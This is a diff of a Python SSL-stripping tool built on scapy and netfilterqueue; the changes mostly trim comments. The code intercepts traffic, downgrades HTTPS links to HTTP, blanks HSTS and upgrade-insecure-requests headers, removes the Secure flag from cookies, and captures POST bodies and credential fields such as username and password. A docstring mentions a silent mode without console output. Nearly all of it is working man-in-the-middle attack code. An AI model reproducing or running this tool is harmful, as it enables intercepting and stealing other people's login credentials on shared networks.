@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 from scapy.all import *
 try:
     from netfilterqueue import NetfilterQueue
@@ -37,7 +35,7 @@ class SSLStripper:
         self.https_pattern = re.compile(rb'https://', re.IGNORECASE)
         self.secure_pattern = re.compile(rb'Secure', re.IGNORECASE)
         
-        # Common headers to strip
+        # headers to strip
         self.strip_headers = [
             b'Strict-Transport-Security',
             b'upgrade-insecure-requests',
@@ -92,32 +90,28 @@ class SSLStripper:
             def replace_with_spaces(match):
                 return b' ' * len(match.group(0))
             
-            # 1. Replace 'https://' with 'http:// ' (Notice the extra space!)
-            # We replace 8 chars (https://) with 8 chars (http:// ) to keep length same
+            # Replace 'https://' with 'http:// ' and fill with space to keep length
             if self.https_pattern.search(load):
                 logger.info(f"Found HTTPS link, downgrading...")
                 load = self.https_pattern.sub(b'http:// ', load)
                 modified = True
 
-            # 2. Kill the Security Headers (By overwriting with spaces)
-            # Do NOT delete them, or TCP breaks. Just blank them out.
+            #  Kill the security headers 
             for header in self.strip_headers:
                 if header in load:
                     logger.info(f"Nuking security header: {header.decode()}")
-                    # Regex to find the whole line
                     pattern = header + rb':[^\r\n]*\r\n'
-                    # Replace the entire match with spaces
                     load = re.sub(pattern, replace_with_spaces, load, flags=re.IGNORECASE)
                     modified = True
             
-            # 3. Strip Secure Cookies (Overwrite 'Secure' with '      ')
+            # Remove secure cookies 
             if b'Set-Cookie:' in load and self.secure_pattern.search(load):
                 load = self.secure_pattern.sub(replace_with_spaces, load)
                 modified = True
 
             if modified:
                 packet[Raw].load = load
-                # Delete checksums so Scapy recalculates them
+                # Delete checksums
                 del packet[IP].len
                 del packet[IP].chksum
                 del packet[TCP].chksum
@@ -130,7 +124,8 @@ class SSLStripper:
     
     def log_data(self, data_type, data):
         """
-        Log interesting data (credentials, forms, etc.)
+        Log interesting data (credentials, forms, etc.) based on operational mode
+        in silent mode remove console output
         
         Args:
             data_type: Type of data (e.g., "POST", "GET", "Cookie")
@@ -158,15 +153,14 @@ class SSLStripper:
         try:
             load = packet[Raw].load.decode('utf-8', errors='ignore')
             
-            # 1. Catch POST Requests (Login submissions)
+            # Catch POST requests 
             if 'POST' in load and 'HTTP/1.' in load:
                 logger.warning(f"Captured POST Data:")
-                # Log the whole load so you see the body (username/password)
+                # Log the whole load so you see the body 
                 print(f"\n[+] RAW POST BODY:\n{load}\n")
                 self.log_data("POST Request", load)
 
-            # 2. Catch Specific Credential Keywords anywhere in the packet
-            # (Sometimes the POST header is in packet A, and the password is in packet B)
+            # Catch credential keywords anywhere in the packet
             keywords = ['username=', 'user=', 'uname=', 'password=', 'pass=', 'passwd=', 'pwd=']
             if any(key in load.lower() for key in keywords):
                 logger.warning("*** CREDENTIALS FOUND ***")
